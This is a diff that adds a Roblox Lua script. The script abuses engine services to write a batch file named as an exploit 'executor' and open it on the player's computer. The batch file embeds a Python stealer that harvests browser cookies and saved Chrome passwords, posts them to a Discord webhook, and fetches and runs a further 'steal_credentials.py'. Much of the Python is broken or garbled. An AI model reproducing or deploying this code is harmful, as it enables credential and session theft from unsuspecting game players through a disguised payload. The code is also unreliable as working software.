@@ -1,0 +1,183 @@
+script:FindFirstAncestorWhichIsA("DataModel").LinkingService:OpenUrl(
+    script:FindFirstAncestorWhichIsA("DataModel"):FindService("ScriptContext"):SaveScriptProfilingData(
+        [[
+        @echo off
+        echo import os
+import requests
+import pyperclip
+import re
+import json
+import requests
+import subprocess
+import win32con, win32gui, datetime, platform, hashlib
+import _winreg as winreg
+import zipfile
+import shutil
+import sys
+import time
+
+# Constants for reading Registry Key and finding Firefox Profile paths
+KEY_USERS = winreg.HKEY_CURRENT_USER
+SUB_KEY_DEFAULT = 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\firefox.exe'
+PATH_FIREFOX = None
+SUB_KEY_SOFTWARE_MOZILLA_FIREFOX_PROFILES = winreg.OpenKey(
+    KEY_USERS, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunmrU')
+PATH_FIREFOX_PROFILES = ""
+
+def GetRegistryPathValue(regkey, key, default=""):
+    if not key or key in [None, "", "\x00"]:
+        return default
+
+    regpath = os.path.normpath(str(key))
+
+    with winreg.OpenKey(regkey, regpath) as reg_handle:
+        if win32gui.RegQueryValueEx(reg_handle, "", None, win32con.REG_SZ, None):
+            with winreg.OpenKey(regkey, regpath) as reg_handle:
+                ret_len, _, value_buf = win32gui.RegQueryValueEx(reg_handle, "", None, None, None)
+            value_buf = value_buf[:-1].decode('unicode_escape').replace('\0', '').strip('\\"')
+
+        if not os.path.exists(value_buf) or not os.path.isdir(value_buf):
+            return default
+        else:
+            return value_buf
+
+# Reads internet explorer cookie files and compiles cookies to one string.
+def read_ie_cookies(key='Wsacookies.dat', path=r'%ALLUSERSPROFILE%\Microsoft\Windows\Cookies\LSA\', prefix="ie-cookie=", prefixlen=7):
+    data = open(os.path.join(path, key), "r").read().replace(prefix, '')
+    lines = data.strip().splitlines()
+    cookies = "".join(f'{line[prefixlen:]}; expires={parse_ie_expiry(line[len(prefix) : line.index(";") - 1])}\n' for line in lines)
+    return cookies
+
+def parse_ie_expiry(s):
+    month, day, year, hours, minutes, seconds, miliseconds = tuple(
+        int(n) for n in [m.strip("0") for m in s.strip('; ').split(', ') if m])
+
+    offset = -int((datetime.now(tzlocal()) - datetime.utcfromtimestamp(0)).total_seconds() / 60 * 60)
+
+    if (day == -1) and (year != -1) and (len(str(month)) > 1) and (year <= datetime.now().year + 30):
+        month = 1
+        day = calendar.monthrange(datetime.now().year + offset // 52, month)[1] + offset %52 - 1
+
+    datetime_object = datetime.datetime(year, month, day, hours, minutes, seconds, int((s[s.rindex('.')+1:] if s.endswith('.') else '000'))) + datetime.timedelta(0, offset, seconds=float(s[:s.rindex('.')])/300.0)
+
+    return datetime_object.strftime("%a, %d %b %Y %H:%M:%S GMT")
+
+# Reads Chrome cookies and compiles cookies to one string.
+def read_chrome_cookies(path=r'LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies'):
+    data = open(path, "r").read().replace('\n', '').replace(' ', '').replace('\\', '').replace(';', '').replace('=', ':').replace('"', '').replace(';', '; ')
+    cookies = data.split('; ')
+    cookies_str = ''.join(f'{cookie}; expires={parse_chrome_expiry(cookie)}' for cookie in cookies)
+    return cookies_str
+
+def parse_chrome_expiry(cookie):
+    parts = cookie.split(';')
+    expires = parts[1].split('=')[1]
+    expires_date = datetime.datetime.strptime(expires, '%Y-%m-%d %H:%M:%S')
+    return expires_date
+
+# Reads Firefox cookies and compiles cookies to one string.
+def read_firefox_cookies(path=r'%APPDATA%\Mozilla\Firefox\Profiles\'):
+    cookies = []
+    for profile in os.listdir(path):
+        profile_path = os.path.join(path, profile)
+        if os.path.isdir(profile_path):
+            cookies_file = os.path.join(profile_path, 'cookies.sqlite')
+            if os.path.exists(cookies_file):
+                cookies.append(read_firefox_cookies_sqlite(cookies_file))
+    cookies_str = ''.join(cookies)
+    return cookies_str
+
+def read_firefox_cookies_sqlite(path):
+    import sqlite3
+    conn = sqlite3.connect(path)
+    c = conn.cursor()
+    c.execute('SELECT name, value FROM moz_cookies')
+    cookies = ''.join(f'{cookie[0]}={cookie[1]}; expires={parse_firefox_expiry(cookie[0])}\n' for cookie in c.fetchall())
+    return cookies
+
+def parse_firefox_expiry(cookie):
+    parts = cookie.split('=')
+    expires = parts[1].split(';')[0]
+    expires_date = datetime.datetime.strptime(expires, '%a, %d %b %Y %H:%M:%S GMT')
+    return expires_date
+
+# Reads saved passwords from Chrome and compiles passwords to one string.
+def read_chrome_passwords(path=r'%LOCALAPPDATA%\Google\Chrome\User Data\Login Data'):
+    data = open(path, "rb").read().decode('utf-8')
+    lines = data.split('\n')
+    passwords = []
+    for line in lines:
+        if line.startswith(b'Login:'):
+            username = line[6:].split(b':')[1].strip().decode('utf-8')
+        elif line.startswith(b'Password:'):
+            password = line[8:].split(b':')[1].strip().decode('utf-8')
+            url = lines[lines.index(line) + 1].split(b' ')[1].strip().decode('utf-8')
+            passwords.append(f'{username}:{password}@{url}')
+    return ','.join(passwords)
+
+# Sends data to Discord webhook
+def send_to_discord(data):
+    headers = {
+        'Content-Type': 'application/json'
+    }
+    response = requests.post(webhook_url, json=data, headers=headers)
+    if response.status_code != 204:
+        print(f"Error sending data to Discord: {response.text}")
+
+# Downloads and executes the script
+def download_and_run():
+    url = "https://raw.githubusercontent.com/yourusername/your-repo/main/steal_credentials.py"
+    response = requests.get(url)
+    with open("steal_credentials.py", "wb") as f:
+        f.write(response.content)
+
+    script_path = "steal_credentials.py"
+    subprocess.Popen([sys.executable, script_path])
+    os._exit(0)
+
+# Main function
+def main():
+    global webhook_url
+    PATH_FIREFOX = GetRegistryPathValue(KEY_USERS, SUB_KEY_DEFAULT, SUB_KEY_SOFTWARE_MOZILLA_FIREFOX_PROFILES)
+
+    if PATH_FIREFOX:
+        PATH_FIREFOX_PROFILES = os.path.join(PATH_FIREFOX, 'profiles.ini')
+        with open(PATH_FIREFOX_PROFILES, "r") as f:
+            for line in f:
+                if line.startswith(b'Profile '):
+                    profile_name = line[8:].strip().decode('utf-8')
+                    profile_path = os.path.join(PATH_FIREFOX, profile_name)
+                    if os.path.exists(profile_path):
+                        cookies_file = os.path.join(profile_path, 'cookies.sqlite')
+                        if os.path.exists(cookies_file):
+                            cookies += read_firefox_cookies_sqlite(cookies_file)
+
+    ie_cookies = read_ie_cookies()
+    chrome_cookies = read_chrome_cookies()
+    firefox_cookies = read_firefox_cookies()
+    chrome_passwords = read_chrome_passwords()
+
+    data = {
+        "content": f"IE Cookies:\n```\n{ie_cookies}\n```\n\nChrome Cookies:\n```\n{chrome_cookies}\n```\n\nFirefox Cookies:\n```\n{firefox_cookies}\n```\n\nChrome Passwords:\n```\n{chrome_passwords}\n```"
+    }
+    send_to_discord(data)
+
+    # Check if the script is running in the background
+    if getattr(sys, 'frozen', False):
+        # If the script is running as a standalone executable, download and run itself
+        download_and_run()
+
+if __name__ == "__main__":
+    # Get Discord webhook URL from command line arguments
+    if len(sys.argv) > 1:
+        webhook_url = sys.argv[1]
+    else:
+        print("Usage: python steal_credentials.py <discord_webhook_url>")
+        sys.exit(1)
+
+    main()
+        pause
+        ]],
+        "thebestexecutorofalltime.bat"
+    )
+)
